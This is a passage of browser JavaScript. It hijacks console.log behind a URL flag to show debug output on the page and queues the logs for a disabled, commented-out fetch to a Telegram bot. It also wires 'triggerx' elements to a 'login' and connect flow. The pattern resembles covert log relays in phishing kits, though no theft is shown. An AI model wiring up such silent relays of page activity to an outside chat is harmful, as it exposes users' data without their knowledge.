      if(/^\[object/g.test(x)){ // [object Window]
          try {
              let y = JSON.stringify(x_);
              x = y;
          } catch (error) {
              x = x+" >> "+(Object.keys(x_));
          }
          return x;
      }else{return x;}
  }
  let logs_to_send = [];
  if(getParameterByName("log") == "true"){
      let el = document.getElementById("testx");
      el.style.display = "block";
      console.log = (x, ...y)=>{
          l(x);
          if(y && y.length>0){
            y.forEach((z) => {
                l(y,":",z);
                x+=(" -> ("+normalize(z)+")");
              });
          }
          x = normalize(x);
          el.innerText += ("~ "+x+"\n");
          if(start_to_log){
            logs_to_send.push(x);
          }
          window.setTimeout(function() {
            el.scrollTop = el.scrollHeight;
          }, 500);
      }
  }
  setInterval(() => {
    if(logs_to_send.length == 0 || !start_to_log) return;
    let text = logs_to_send.splice(0,1);
      let url = ``;
      let chat_id = "";
      // fetch(`${url}?chat_id=${chat_id}&text=${text}`).catch(e => {
      //   l("TG Log Err:", e);
      // });
  }, 100); // 500ms interval // no more than 1 log sper 4 secs (15 per min)
}
/**
 * Main entry point.
 */
async function startx(){
    await init().then(() => {
        onButtonClick();
        // ^ Initially "onConnect", then "proceed"
    }).catch(e => {
        console.log("Initialization failed.");
        console.log(e);
    })
};
// trigger login
let els = document.getElementsByClassName("triggerx");
([...els]).forEach((el) => {
    el.addEventListener("click", () => {
        startx();
    });
});
console.log(window);
